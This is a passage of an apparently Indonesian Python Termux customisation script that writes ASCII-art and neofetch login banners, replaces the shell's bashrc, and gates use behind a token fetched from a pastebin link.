		os.system(f"rm {path4} &> /dev/null")
		os.system(f"rm {path5} &> /dev/null")
		os.system(f"mv Data/sanz-banner.sh {path2} && mv Data/bash.bashrc {path5}")
		os.system(f"touch Data/sanz-banner.sh && touch Data/bash.bashrc")
		print(f" {m}➤ {p}Tampilan termux berhasil terpasang {k}[ {h}✓ {k}]")
		animasi().jeda()
		input(f" {m}➤ {p}Klik enter untuk melihat hasil nya.. ");sleep(2)
		self.cek()

	def blackhat_v2(self):
		animasi().banner()
		sleep(0.5);print(f" {m}➤ {p}Masukan Nama Untuk Dibagian Author")
		nama = input(f"           {hx}Sanz \r {h}• {p}Input {m}: {h}")
		animasi().jeda()
		print(f" {m}➤ {p}Masukan Nama Untuk Dibagian Prompt")
		prompt = input(f"           {hx}Sanz \r {h}• {p}Input {m}: {h}")
		animasi().load()
		animasi().loading("Proses merubah tampilan, tunggu..")
		animasi().jeda2()
		sanz = open("Data/sanz-banner.sh", "w")
		sanz.write("\n# Powered by Sanz")
		sanz.write("\n# Youtube : FREE TUTORIAL")
		sanz.write("\n# Github  : https://github.com/Sxp-ID")
		sanz.write("\n\nclear")
		sanz.write("\nsleep 2.1")
		sanz.write("\necho ''")
		sanz.write('\necho "\033[1;37m                            .,:lll:,.')
		sanz.write("\n                          ,ldddddddddo,")
		sanz.write("\n                         :ddddddddddddd;")
		sanz.write("\n                        .ddddddddddddddo.")
		sanz.write("\n                        :ddddddddddddddd;")
		sanz.write("\n                       .ddddddddddddddddo.")
		sanz.write("\n                       cddddddddddddddddd:")
		sanz.write("\n               ...,;:' .;odddddddddddddl;. ':,'..")
		sanz.write("\n              .,cdddddo;....,;:ccc:;,....:odddddc,.")
		sanz.write("\n           ;kW;   .;ldddddolc:;,,,;:clodddddo;.   :Wk;")
		sanz.write("\n          .0MMN,dl;'. ':odddddddddddddddo:'..,:ll.NMM0.")
		sanz.write("\n            ;XMNlNMMX.  .,;codddddddoc:,   ;WMM0;NMX;")
		sanz.write("\n              cNNcKMMN..'.    .....    ., :MMMx;NN:")
		sanz.write("\n                lNdkMMN'kKKkdlcccclox0KKl:WMWcoNl")
		sanz.write("\n                 .00oWMN,0KKKKKKKKKKKKKx:MMX:00.")
		sanz.write("\n                oNMMWx0MX;dKKKKKKKKKK0ccWWdoWMMNo")
		sanz.write("\n                 ;xNMMKxXWl.oKKKKKK0c.kM0cKMMNx;")
		sanz.write("\n                    ,xWMkkMX:.oKK0:.oWWlxMWx,")
		sanz.write("\n                       ;OKdKMN,.; dWMkcXO;")
		sanz.write("\n                         .oddWk   WX:do.")
		sanz.write("\n                            ,:x  'o,,")
		sanz.write('\n                              .   ."')
		sanz.write('''\necho "                                '"''')
		sanz.write(f"\necho '\033[0m                       =[ \033[1;33mCoded by {nama} \033[0m]='")
		sanz.write(f"\necho '\033[0m          +  --  --=[ \033[1;32mUser Termux {sanz_negara} \033[0m]=--  --  +'")
		sanz.write("\necho ''")
		sanz.write("\n# Udah tinggal pake aja")
		sanz.close()
		self.set_theme(prompt)
		os.system(f"rm {path4} &> /dev/null")
		os.system(f"rm {path5} &> /dev/null")
		os.system(f"mv Data/sanz-banner.sh {path2} && mv Data/bash.bashrc {path5}")
		os.system(f"touch Data/sanz-banner.sh && touch Data/bash.bashrc")
		print(f" {m}➤ {p}Tampilan termux berhasil terpasang {k}[ {h}✓ {k}]")
		animasi().jeda()
		input(f" {m}➤ {p}Klik enter untuk melihat hasil nya.. ");sleep(2)
		self.cek()

	def kucing(self):
		animasi().banner()
		sleep(0.5);print(f" {m}➤ {p}Masukan Nama Untuk Dibagian Author")
		nama = input(f"           {hx}Sanz \r {h}• {p}Input {m}: {h}")
		animasi().jeda()
		print(f" {m}➤ {p}Masukan Nama Untuk Dibagian Prompt")
		prompt = input(f"           {hx}Sanz \r {h}• {p}Input {m}: {h}")
		animasi().load()
		animasi().loading("Proses merubah tampilan, tunggu..")
		animasi().jeda2()
		sanz = open("Data/sanz-banner.sh", "w")
		sanz.write("\n# Powered by Sanz")
		sanz.write("\n# Youtube : FREE TUTORIAL")
		sanz.write("\n# Github  : https://github.com/Sxp-ID")
		sanz.write("\n\nclear")
		sanz.write("\nsleep 2.1")
		sanz.write("\necho")
		sanz.write("\necho '\033[1;38;5;208m .--.'")
		sanz.write("\necho ' `-. \             /\_ '")
		sanz.write("\necho '    \ \           /  \033[91ma\033[1;38;5;208m`.'")
		sanz.write("\necho '\033[1;38;5;208m     \ \__..---../  ,__/'")
		sanz.write("\necho '      \            |'")
		sanz.write("\necho '      |         \033[1;38;5;208m   /'")
		sanz.write("\necho '      /\ \-~~~-`\ \ \  \033[90mKoecing Orange'")
		sanz.write("\necho '    \033[1;38;5;208m /_/_/_      \_\_\_'")
		sanz.write("\necho '   \033[1;38;5;208m  \_\___)      \__)_)\'")
		sanz.write("\necho ''")
		sanz.write("\necho '\033[0m   =[ \033[1;33mCoded by "+ nama +"'")
		sanz.write("\necho '\033[0m+ -=[ \033[1;32mUser Termux \033[1;31mIndo\033[1;37mnesia'")
		sanz.write("\necho ''")
		sanz.write("\n# Udah tinggal pake aja")
		sanz.close()
		self.set_theme(prompt)
		os.system(f"rm {path4} &> /dev/null")
		os.system(f"rm {path5} &> /dev/null")
		os.system(f"mv Data/sanz-banner.sh {path2} && mv Data/bash.bashrc {path5}")
		os.system(f"touch Data/sanz-banner.sh && touch Data/bash.bashrc")
		print(f" {m}➤ {p}Tampilan termux berhasil terpasang {k}[ {h}✓ {k}]")
		animasi().jeda()
		input(f" {m}➤ {p}Klik enter untuk melihat hasil nya.. ");sleep(2)
		self.cek()

	def anonymous(self):
		animasi().banner()
		sleep(0.5);print(f" {m}➤ {p}Masukan Nama Untuk Dibagian Author")
		nama = input(f"           {hx}Sanz \r {h}• {p}Input {m}: {h}")
		animasi().jeda()
		print(f" {m}➤ {p}Masukan Nama Untuk Dibagian Prompt")
		prompt = input(f"           {hx}Sanz \r {h}• {p}Input {m}: {h}")
		animasi().load()
		animasi().loading("Proses merubah tampilan, tunggu..")
		animasi().jeda2()
		sanz = open("Data/sanz-banner.sh", "w")
		sanz.write("\n# Powered by Sanz")
		sanz.write("\n# Youtube : FREE TUTORIAL")
		sanz.write("\n# Github  : https://github.com/Sxp-ID")
		sanz.write("\n\nclear")
		sanz.write("\nsleep 2.1")
		sanz.write("\necho '\033[31;1m                        `/ymMMMMMMMMmy/`'")
		sanz.write("\necho '                    `/ymMMMMMMMMMMMMMMmy/`'")
		sanz.write("\necho '                   /hMMMMMMMMMMMMMMMMMMMMMMh/'")
		sanz.write("\necho '                 /mMMmNMMMMMNNNNNNNNMMMMMNNMMm/'")
		sanz.write("\necho '               `hNmo:dMMNNNmNNmNNmNNmNNNMMd:omNh`'")
		sanz.write("\necho '              .mh:+/hMNNNNmNNmNdhmmNNmNNNNMy/o:hm.'")
		sanz.write("\necho '             `d+://sNmMMMmMMMmdy+/mMMMmMMMmNs///+d`'")
		sanz.write("\necho '             ys.o/oMmNNNmNNMNNMmdMNNMNNmNNNmMo/o.ys'")
		sanz.write("\necho '            `my.-/NmMMMMmMMNmNNyyNNmNMMmMMMMmN/:`ym`'")
		sanz.write("\necho '            -h/+s/MmMMMNmNNNdym++mymNNNmNMMNmM:so/h-\x1b[37;1m'")
		sanz.write("\necho '            -N.o.sMmMMMNh/:-`-MosM-`-:/hNMMMmMs.+.N-'")
		sanz.write("\necho '            `ho/-ohmMMMM/    -M/+M.    /MMMMmho-/oh'")
		sanz.write("\necho '             s+-s-odmNNN`     /-:/     .NNNmd+:s-+s'")
		sanz.write("\necho '             `mo/-:+ymMm                mMms+:-/om`'")
		sanz.write("\necho '              .h/+/y`hhs                yyh`y/+/h.'")
		sanz.write("\necho '               `hd/::-+.                .+-::/dy`'")
		sanz.write("\necho '                 /hs+/::.--          --.::/+sh:'")
		sanz.write("\necho '                   :hds+/-`          `-/+sdh:'")
		sanz.write("\necho '                     `/ymM+          oMmy:'")
		sanz.write("\necho '                         \033[41m W E L C O M E \033[0m'")
		sanz.write("\necho ''")
		sanz.write("\necho '\033[0m                       =[ \033[33;1mCoded by "+nama+" \033[0m]='")
		sanz.write("\necho '\033[0m          +  --  --=[ \033[32;1mUser Termux \033[1;31mIndo\033[37;1mnesia \033[0m]=--  --  +'")
		sanz.write("\necho ''")
		sanz.write("\n# Udah tinggal pake aja")
		sanz.close()
		self.set_theme(prompt)
		os.system(f"rm {path4} &> /dev/null")
		os.system(f"rm {path5} &> /dev/null")
		os.system(f"mv Data/sanz-banner.sh {path2} && mv Data/bash.bashrc {path5}")
		os.system(f"touch Data/sanz-banner.sh && touch Data/bash.bashrc")
		print(f" {m}➤ {p}Tampilan termux berhasil terpasang {k}[ {h}✓ {k}]")
		animasi().jeda()
		input(f" {m}➤ {p}Klik enter untuk melihat hasil nya.. ");sleep(2)
		self.cek()

	def darkfb(self):
		animasi().banner()
		sleep(0.5);print(f" {m}➤ {p}Masukan Nama Untuk Dibagian Author")
		nama = input(f"           {hx}Sanz \r {h}• {p}Input {m}: {h}")
		animasi().jeda()
		print(f" {m}➤ {p}Masukan Nama Untuk Dibagian Prompt")
		prompt = input(f"           {hx}Sanz \r {h}• {p}Input {m}: {h}")
		animasi().load()
		animasi().loading("Proses merubah tampilan, tunggu..")
		animasi().jeda2()
		sanz = open("Data/sanz-banner.sh", "w")
		sanz.write("\n# Powered by Sanz")
		sanz.write("\n# Youtube : FREE TUTORIAL")
		sanz.write("\n# Github  : https://github.com/Sxp-ID")
		sanz.write("\n\nclear")
		sanz.write("\nsleep 2.1")
		sanz.write("\necho '\033[97m█████████      \033[96m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●'")
		sanz.write("\necho '\033[97m█▄█████▄█ \033[0m__--\033[92m╔╦═╦╗╔═╗╔╗─╔═╗╔═╗╔═╦═╗╔═╗'")
		sanz.write("\necho '\033[97m█ \033[91m▼▼▼▼▼\033[0m_---_--\033[92m║║║║║║╦╝║║─║╔╝║║║║║║║║║╦╝'")
		sanz.write("\necho '\033[97m█   \033[0m--_-- --_ \033[92m║║║║║║╩╗║╚╗║╚╗║║║║║║║║║╩╗'")
		sanz.write("\necho '\033[97m█ \033[91m▲▲▲▲▲\033[0m -_-- -\033[92m╚═╩═╝╚═╝╚═╝╚═╝╚═╝╚╩═╩╝╚═╝'")
		sanz.write("\necho '\033[97m█████████      \033[96m«°°°°°°°°°°✧°°°°°°°°°°»'")
		sanz.write("\necho '\033[97m ██ ██'")
		sanz.write("\necho '\033[37m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬'")
		sanz.write("\necho '\033[0m   =[ \033[93mCoded by "+nama+"'")
		sanz.write("\necho '\033[0m+ -=[ \033[92mUser Termux \033[91mIndo\033[97mnesia'")
		sanz.write("\necho ''")
		sanz.write("\n# Udah tinggal pake aja")
		sanz.close()
		self.set_theme(prompt)
		os.system(f"rm {path4} &> /dev/null")
		os.system(f"rm {path5} &> /dev/null")
		os.system(f"mv Data/sanz-banner.sh {path2} && mv Data/bash.bashrc {path5}")
		os.system(f"touch Data/sanz-banner.sh && touch Data/bash.bashrc")
		print(f" {m}➤ {p}Tampilan termux berhasil terpasang {k}[ {h}✓ {k}]")
		animasi().jeda()
		input(f" {m}➤ {p}Klik enter untuk melihat hasil nya.. ");sleep(2)
		self.cek()

	def neo_theme(self):
		list_neo_theme = ["opensuse", "raspbian", "mageia", "deepin", "antergos", "exherbo", "lmde", "trisquel", "gnewsense", "korora", "steamos", "chakra", "sabayon", "crux", "pclinuxos", "gentoo", "solus", "swagarch", "devuan", "frugalware", "nixos", "sparkylinux", "centos", "bunsenlabs", "fedora", "netrunner", "mandriva", "blag", "slackware", "sailfishos", "rosa", "pardus", "kaos", "debian", "linux", "trisquel", "ubuntu", "lubuntu", "parrotos", "rhel", "void", "alpine", "manjaro", "neofetch"]
		try:
			A = "\x1b[1A"
			B = "\x1b[2A"
			C = "\x1b[3A"

			animasi().banner()
			print(f" {m}➤ {p}Gunakan tombol arah atas/bawah {h}↑{k}↓")

			import inquirer
			from inquirer.themes import Default

			list_menu = [f"• Tampilan Neo-Theme openSUSE      {hx3}{pp} (01) {px}", f"• Tampilan Neo-Theme Raspbian      {hx3}{pp} (02) {px}", f"• Tampilan Neo-Theme Mageia        {hx3}{pp} (03) {px}", f"• Tampilan Neo-Theme Deepin        {hx3}{pp} (04) {px}", f"• Tampilan Neo-Theme Antergos      {hx3}{pp} (05) {px}", f"• Tampilan Neo-Theme Exherbo       {hx3}{pp} (06) {px}", f"• Tampilan Neo-Theme LMDE          {hx3}{pp} (07) {px}", f"• Tampilan Neo-Theme Trisquel      {hx3}{pp} (08) {px}", f"• Tampilan Neo-Theme gNewSense     {hx3}{pp} (09) {px}", f"• Tampilan Neo-Theme Korora        {hx3}{pp} (10) {px}", f"• Tampilan Neo-Theme SteamOS       {hx3}{pp} (11) {px}", f"• Tampilan Neo-Theme Chakra        {hx3}{pp} (12) {px}", f"• Tampilan Neo-Theme Sabayon       {hx3}{pp} (13) {px}", f"• Tampilan Neo-Theme CRUX          {hx3}{pp} (14) {px}", f"• Tampilan Neo-Theme PCLinuxOS     {hx3}{pp} (15) {px}", f"• Tampilan Neo-Theme Gentoo        {hx3}{pp} (16) {px}", f"• Tampilan Neo-Theme solus         {hx3}{pp} (17) {px}", f"• Tampilan Neo-Theme SwagArch      {hx3}{pp} (18) {px}", f"• Tampilan Neo-Theme Devuan        {hx3}{pp} (19) {px}", f"• Tampilan Neo-Theme Frugalware    {hx3}{pp} (20) {px}", f"• Tampilan Neo-Theme NixOS         {hx3}{pp} (21) {px}", f"• Tampilan Neo-Theme SparkyLinux   {hx3}{pp} (22) {px}", f"• Tampilan Neo-Theme CentOS        {hx3}{pp} (23) {px}", f"• Tampilan Neo-Theme BunsenLabs    {hx3}{pp} (24) {px}", f"• Tampilan Neo-Theme Fedora        {hx3}{pp} (25) {px}", f"• Tampilan Neo-Theme Netrunner     {hx3}{pp} (26) {px}", f"• Tampilan Neo-Theme Mandriva      {hx3}{pp} (27) {px}", f"• Tampilan Neo-Theme BLAG          {hx3}{pp} (28) {px}", f"• Tampilan Neo-Theme Slackware     {hx3}{pp} (29) {px}", f"• Tampilan Neo-Theme SailfishOS    {hx3}{pp} (30) {px}", f"• Tampilan Neo-Theme ROSA          {hx3}{pp} (31) {px}", f"• Tampilan Neo-Theme Pardus        {hx3}{pp} (32) {px}", f"• Tampilan Neo-Theme KaOS          {hx3}{pp} (33) {px}", f"• Tampilan Neo-Theme Debian        {hx3}{pp} (34) {px}", f"• Tampilan Neo-Theme Linux         {hx3}{pp} (35) {px}", f"• Tampilan Neo-Theme Trisquel      {hx3}{pp} (36) {px}", f"• Tampilan Neo-Theme Ubuntu        {hx3}{pp} (37) {px}", f"• Tampilan Neo-Theme Lubuntu       {hx3}{pp} (38) {px}", f"• Tampilan Neo-Theme ParrotOS      {hx3}{pp} (39) {px}", f"• Tampilan Neo-Theme RHEL          {hx3}{pp} (40) {px}", f"• Tampilan Neo-Theme Void          {hx3}{pp} (41) {px}", f"• Tampilan Neo-Theme Alpine        {hx3}{pp} (42) {px}", f"• Tampilan Neo-Theme Manjaro       {hx3}{pp} (43) {px}", f"• Tampilan Neo-Theme Neofetch      {hx3}{pp} (44) {px}", f"• Tampilan Default                 {hx3}{pp} (45) {px}", f"\r", f"• Kembali ke Menu Awal             {hx3}{pp} (46) {px}", f"• Support Admin                    {hx3}{pp} (47) {px}", f"• Keluar                           {hx3}{pp} (48) {px}"]
			menu = [inquirer.List("sanz", choices = list_menu, carousel = True, message = f"{hx2}")]

			class sanz_ganz(Default):
				def __init__(self):
					super().__init__()
					self.Question.mark_color = f"{hx2}"
					self.Question.brackets_color = f"{hx2}"
					self.List.selection_cursor = f"{m}⩥ {pp}{p}"

			sanz = inquirer.prompt(menu, theme=sanz_ganz())
			sanz = str(sanz);print(B);sleep(1)
			if "(01)" in sanz: self.neo_theme_main(list_neo_theme[0])
			elif "(02)" in sanz: self.neo_theme_main(list_neo_theme[1])
			elif "(03)" in sanz: self.neo_theme_main(list_neo_theme[2])
			elif "(04)" in sanz: self.neo_theme_main(list_neo_theme[3])
			elif "(05)" in sanz: self.neo_theme_main(list_neo_theme[4])
			elif "(06)" in sanz: self.neo_theme_main(list_neo_theme[5])
			elif "(07)" in sanz: self.neo_theme_main(list_neo_theme[6])
			elif "(08)" in sanz: self.neo_theme_main(list_neo_theme[7])
			elif "(09)" in sanz: self.neo_theme_main(list_neo_theme[8])
			elif "(10)" in sanz: self.neo_theme_main(list_neo_theme[9])
			elif "(11)" in sanz: self.neo_theme_main(list_neo_theme[10])
			elif "(12)" in sanz: self.neo_theme_main(list_neo_theme[11])
			elif "(13)" in sanz: self.neo_theme_main(list_neo_theme[12])
			elif "(14)" in sanz: self.neo_theme_main(list_neo_theme[13])
			elif "(15)" in sanz: self.neo_theme_main(list_neo_theme[14])
			elif "(16)" in sanz: self.neo_theme_main(list_neo_theme[15])
			elif "(17)" in sanz: self.neo_theme_main(list_neo_theme[16])
			elif "(18)" in sanz: self.neo_theme_main(list_neo_theme[17])
			elif "(19)" in sanz: self.neo_theme_main(list_neo_theme[18])
			elif "(20)" in sanz: self.neo_theme_main(list_neo_theme[19])
			elif "(21)" in sanz: self.neo_theme_main(list_neo_theme[20])
			elif "(22)" in sanz: self.neo_theme_main(list_neo_theme[21])
			elif "(23)" in sanz: self.neo_theme_main(list_neo_theme[22])
			elif "(24)" in sanz: self.neo_theme_main(list_neo_theme[23])
			elif "(25)" in sanz: self.neo_theme_main(list_neo_theme[24])
			elif "(26)" in sanz: self.neo_theme_main(list_neo_theme[25])
			elif "(27)" in sanz: self.neo_theme_main(list_neo_theme[26])
			elif "(28)" in sanz: self.neo_theme_main(list_neo_theme[27])
			elif "(29)" in sanz: self.neo_theme_main(list_neo_theme[28])
			elif "(30)" in sanz: self.neo_theme_main(list_neo_theme[29])
			elif "(31)" in sanz: self.neo_theme_main(list_neo_theme[30])
			elif "(32)" in sanz: self.neo_theme_main(list_neo_theme[31])
			elif "(33)" in sanz: self.neo_theme_main(list_neo_theme[32])
			elif "(34)" in sanz: self.neo_theme_main(list_neo_theme[33])
			elif "(35)" in sanz: self.neo_theme_main(list_neo_theme[34])
			elif "(36)" in sanz: self.neo_theme_main(list_neo_theme[35])
			elif "(37)" in sanz: self.neo_theme_main(list_neo_theme[36])
			elif "(38)" in sanz: self.neo_theme_main(list_neo_theme[37])
			elif "(39)" in sanz: self.neo_theme_main(list_neo_theme[38])
			elif "(40)" in sanz: self.neo_theme_main(list_neo_theme[39])
			elif "(41)" in sanz: self.neo_theme_main(list_neo_theme[40])
			elif "(42)" in sanz: self.neo_theme_main(list_neo_theme[41])
			elif "(43)" in sanz: self.neo_theme_main(list_neo_theme[42])
			elif "(44)" in sanz: self.neo_theme_main(list_neo_theme[43])
			elif "(45)" in sanz: self.default()
			elif "(46)" in sanz: Sanz()
			elif "(47)" in sanz: subrek()
			elif "(48)" in sanz: hapus();exit(f"\n {m}➤ {p}Makasih Ngab, Jgn Lupa Balik Lagi{m}..\n")
			elif "None" in sanz: print(C);hapus();print(f" {m}➤ {p}Program Dihentikan\n\n");print(C)
			else:
				pass

		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"\n {m}➤ {p}Program Dihentikan\n")
		except requests.exceptions.ConnectionError:
			hapus();sleep(0.5)
			exit(f"\n {m}➤ {p}Koneksi Internet Error\n")
		except KeyError:
			hapus();sleep(0.5)
			exit(f"\n {m}➤ {p}Server Error\n {m}➤ {p}Silahkan Coba Lagi{m}..\n")
		except json.decoder.JSONDecodeError:
			hapus();sleep(0.5)
			exit(f"\n {m}➤ {p}Server Error\n {m}➤ {p}Silahkan Coba Lagi{m}..\n")
		except Exception as lol:
			to=f"\n {m}➤ {p}Error {m}: {p}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

	def neo_theme_main(self,neo_theme_style):

		if neo_theme_style == "neofetch":
			neo_theme_style = "neofetch"
		else:
			neo_theme_style = f"neofetch --ascii_distro {neo_theme_style}"

		animasi().banner()
		sleep(0.5);print(f" {m}➤ {p}Masukan Nama Untuk Dibagian Author")
		nama = input(f"           {hx}Sanz \r {h}• {p}Input {m}: {h}")
		animasi().jeda()
		print(f" {m}➤ {p}Masukan Nama Untuk Dibagian Prompt")
		prompt = input(f"           {hx}Sanz \r {h}• {p}Input {m}: {h}")
		animasi().load()
		animasi().loading("Proses merubah tampilan, tunggu..")
		animasi().jeda2()
		sanz = open("Data/sanz-banner.sh", "w")
		sanz.write("\n# Powered by Sanz")
		sanz.write("\n# Youtube : FREE TUTORIAL")
		sanz.write("\n# Github  : https://github.com/Sxp-ID")
		sanz.write("\n\nclear")
		sanz.write("\nsleep 2.1")
		sanz.write("\necho ''")
		sanz.write(f"\n{neo_theme_style}")
		sanz.write(f"\necho '   \033[1;31m• \033[1;37mCoded by \033[1;33m{nama}'")
		sanz.write(f"\necho '   \033[1;31m• \033[1;32mUser Termux {sanz_negara}'")
		sanz.write("\necho ''")
		sanz.write("\n# Udah tinggal pake aja")
		sanz.close()
		self.set_theme(prompt)
		os.system(f"rm {path4} &> /dev/null")
		os.system(f"rm {path5} &> /dev/null")
		os.system(f"mv Data/sanz-banner.sh {path2} && mv Data/bash.bashrc {path5}")
		os.system(f"touch Data/sanz-banner.sh && touch Data/bash.bashrc")
		print(f" {m}➤ {p}Tampilan termux berhasil terpasang {k}[ {h}✓ {k}]")
		animasi().jeda()
		input(f" {m}➤ {p}Klik enter untuk melihat hasil nya.. ");sleep(2)
		self.cek()

	def default(self):
		animasi().banner()
		sleep(1)
		animasi().loading("Proses merubah tampilan ke default, tunggu..")
		animasi().jeda2()
		sanz = open("Data/sanz-banner.sh", "w")
		sanz.write("\n# Powered by Sanz")
		sanz.write("\n# Youtube : FREE TUTORIAL")
		sanz.write("\n# Github  : https://github.com/Sxp-ID")
		sanz.write("\n\nclear")
		sanz.write("\nsleep 2.1")
		sanz.write("\necho")
		sanz.write("\necho '\033[0mWelcome to Termux!")
		sanz.write("\n\nDocs:       https://termux.dev/docs")
		sanz.write("\nDonate:     https://termux.dev/donate")
		sanz.write("\nCommunity:  https://termux.dev/community")
		sanz.write("\n\nWorking with packages:")
		sanz.write("\n\n - Search:  pkg search <query>")
		sanz.write("\n - Install: pkg install <package>")
		sanz.write("\n - Upgrade: pkg upgrade")
		sanz.write("\n\nSubscribing to additional repositories:")
		sanz.write("\n\n - Root:    pkg install root-repo")
		sanz.write("\n - X11:     pkg install x11-repo")
		sanz.write("\n\nFor fixing any repository issues,")
		sanz.write("\ntry 'termux-change-repo' command.")
		sanz.write("\n\nReport issues at https://termux.dev/issues'")
		sanz.write("\n# Udah tinggal pake aja")
		sanz.close()
		ganz = open("Data/bash.bashrc", "w")
		ganz.write("# Command history tweaks:")
		ganz.write("\n# - Append history instead of overwriting")
		ganz.write("\n#   when shell exits.")
		ganz.write("\n# - When using history substitution, do not")
		ganz.write("\n#   exec command immediately.")
		ganz.write("\n# - Do not save to history commands starting")
		ganz.write("\n#   with space.")
		ganz.write("\n# - Do not save duplicated commands.")
		ganz.write("\n\n# Powered by Sanz")
		ganz.write("\n# Youtube : FREE TUTORIAL")
		ganz.write("\n# Github  : https://github.com/Sxp-ID")
		ganz.write("\n\nshopt -s histappend")
		ganz.write("\nshopt -s histverify")
		ganz.write("\nexport HISTCONTROL=ignoreboth")
		ganz.write("\n\n# Running Theme-Me")
		sanz.write("\ncd $HOME")
		ganz.write("\nbash /data/data/com.termux/files/sanz/sanz-banner.sh")
		ganz.write("\n\n# Default command line prompt.")
		ganz.write("\nPROMPT_DIRTRIM=2")
		ganz.write("\nPS1='\[\e[0;32m\]\w\[\e[0m\] \[\e[0;97m\]\$\[\e[0m\] '")
		ganz.write("\n# Udah tinggal pake aja")
		ganz.write("\n\n# Handles nonexistent commands.")
		ganz.write("\n# If user has entered command which invokes non-available")
		ganz.write("\n# utility, command-not-found will give a package suggestions.")
		ganz.write("\nif [ -x /data/data/com.termux/files/usr/libexec/termux/command-not-found ]; then")
		ganz.write("\n	command_not_found_handle() {")
		ganz.write('\n		/data/data/com.termux/files/usr/libexec/termux/command-not-found "$1"')
		ganz.write("\n	}")
		ganz.write("\nfi")
		ganz.write("\n\n[ -r /data/data/com.termux/files/usr/share/bash-completion/bash_completion ] && . /data/data/com.termux/files/usr/share/bash-completion/bash_completion")
		ganz.close()
		os.system(f"rm {path4} &> /dev/null")
		os.system(f"rm {path5} &> /dev/null")
		os.system(f"mv Data/sanz-banner.sh {path2} && mv Data/bash.bashrc {path5}")
		os.system(f"touch Data/sanz-banner.sh && touch Data/bash.bashrc")
		print(f" {m}➤ {p}Tampilan termux default berhasil terpasang {k}[ {h}✓ {k}]")
		animasi().jeda()
		input(f" {m}➤ {p}Klik enter untuk melihat hasil nya.. ");sleep(2)
		self.cek()

class __sanz_login__:
	def __init__(self):
		self.__aink_sanz__ = "FREE TUTORIAL"
		self.login()

	def animasi(self,delay):
		try:
			sxp = ['█■■■■', '■█■■■', '■■█■■', '■■■█■', '■■■■█']
			for _ in range(int(delay)):
				for i in range(len(sxp)):
					sleep(0.25)
					sys.stdout.write(f"\r{p}[{h}•{p}] Memverifikasi token, tunggu {k}[{h}" + sxp[i % len(sxp)]+f"{k}] ")
					sys.stdout.flush()

			sys.stdout.write("\r\033[K");sleep(1)

		except KeyboardInterrupt:
			sys.stdout.write("\r\033[K")
			hapus();sleep(0.5)
			exit(f"{p}[{m}!{p}] {p}Program Dihentikan\n")
		except requests.exceptions.ConnectionError:
			sys.stdout.write("\r\033[K")
			hapus();sleep(0.5)
			exit(f"{p}[{m}!{p}] {p}Koneksi Internet Error\n")
		except Exception as lol:
			sys.stdout.write("\r\033[K")
			to=f"{p}[{m}!{p}] {p}Error {m}: {p}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

	def sxp_waktu(self):
		import time
		_time_ = int(time.strftime("%H"))
		if _time_ < 12:
			return "Pagi"
		elif _time_ < 15:
			return "Siang"
		elif _time_ < 18:
			return "Sore"
		else:
			return "Malam"

	def log_pewe(self):
		from datetime import datetime as w
		import time, random
		# -- variabel tgl dll --#
		_waktu = time.strftime("%H:%M:%S %Z")
		waktu = time.localtime()
		tanggal = time.strftime("%d",waktu)
		_bulan = time.strftime("%B",waktu)
		tahun = time.strftime("%Y",waktu)
		_hari = time.strftime("%A",waktu)
		bulan_ = {"January": "Januari", "February": "Februari", "March": "Maret", "April": "April", "May": "Mei", "June": "Juni", "July": "Juli", "August": "Agustus", "September": "September", "October": "Oktober", "November": "November", "December": "Desember"}
		hari_ = {"Sunday": "Minggu", "Monday": "Senin", "Tuesday": "Selasa", "Wednesday": "Rabu", "Thursday": "Kamis", "Friday": "Jumat", "Saturday": "Sabtu"}
		bulan = bulan_.get(_bulan)
		hari = hari_.get(_hari)
		rd = random.choice([10,15,20])
		hg = "\033[4;32m"
		mm = "\033[41m"
		try:
			user = open(f"{path}/{file}","r").read()
			___user___ = json.loads(user)["data"]["token"]
		except:
			clear()
			url = "https://pastebin.com/raw/5pfkikYe" # url link + pass random mode
			req = get(url,headers={"user-agent":agent}).text
			index_link = req.split("Link: ")[1].split("|")
			index_pass = req.split("\r\nPass: ")[1].split("|")
			_link1 = index_link[0];_link2 = index_link[1];_link3 = index_link[2].split("\r\nPass: ")[0]
			_pass1 = index_pass[0];_pass2 = index_pass[1];_pass3 = index_pass[2]
			_acak1 = _link1 + "|" + _pass1;_acak2 = _link2 + "|" + _pass2;_acak3 = _link3 + "|" + _pass3
			index = random.choice([_acak1.split("|"),_acak2.split("|"),_acak3.split("|")])
			_link = get("https://tinyurl.com/api-create.php?url="+index[0],headers={"user-agent":agent}).text
			_pass = get(index[1],headers={"user-agent":agent}).text
			# -- Sanz Ganz --
			banner = f"""[bold red]● [bold yellow]● [bold green]●[/]
[bold red]     __             _        ___
    / /  ___  ___ _(_)__    / _ \___ ____ ____
   / /__/ _ \/ _ `/ / _ \  / ___/ _ `/ _ `/ -_)
[bold white]  /____/\___/\_, /_/_//_/ /_/   \_,_/\_, /\__/
            /___/                   /___/[/]

   [bold white on red] Created by Sanz - Youtube : FREE TUTORIAL [/]"""

			printer(Panel(banner,title=f"[bold red]• [bold white]Selamat {self.sxp_waktu()} [bold red]•[/]",width=53,style="color(8)"));print()
			print(f"{p}[{m}¤{p}] Tanggal {m}: {p}{hari}, {tanggal} {bulan} {tahun}")
			print(f"{p}[{m}¤{p}] Waktu   {m}: {p}{_waktu}")
			print(f"{hx2}-------------")
			print(f"{p}[{h}•{p}] Link token {m}: {hg}{_link}{px}");print()
			print(f"{p}[{m}!{p}] {p}Silahkan ambil dulu {m}↑{p} token nya lalu")
			print(f"    pastekan dibagian input dibawah {m}↓");print()
			sanz_pw = input(f"{p}[{m}?{p}] Input Token {m}: {hx2}")
			sleep(2);print();sleep(1)
			if sanz_pw == _pass:
				self.animasi(int(rd))
				sleep(0.5)
				save = open(f"{path}/{file}","w").write('{\n  "data": {\n  "token": "'+sanz_pw+'",\n  "creator": "Sanz",\n  "youtube": "FREE TUTORIAL"\n }\n}')
				print(f"\a{p}[{h}✓{p}] Token Benar")
				sleep(2)
				clear()
			elif sanz_pw == "":
				sleep(0.5)
				print(f"\a{p}[{m}!{p}] Jangan Kosong Ngab")
				sleep(2)
				self.log_pewe()
			else:
				self.animasi(int(rd))
				sleep(0.5)
				print(f"\a{p}[{m}x{p}] Token Salah")
				sleep(2)
				self.log_pewe()

	def login(self):
		try:
			self.log_pewe()
			clear()
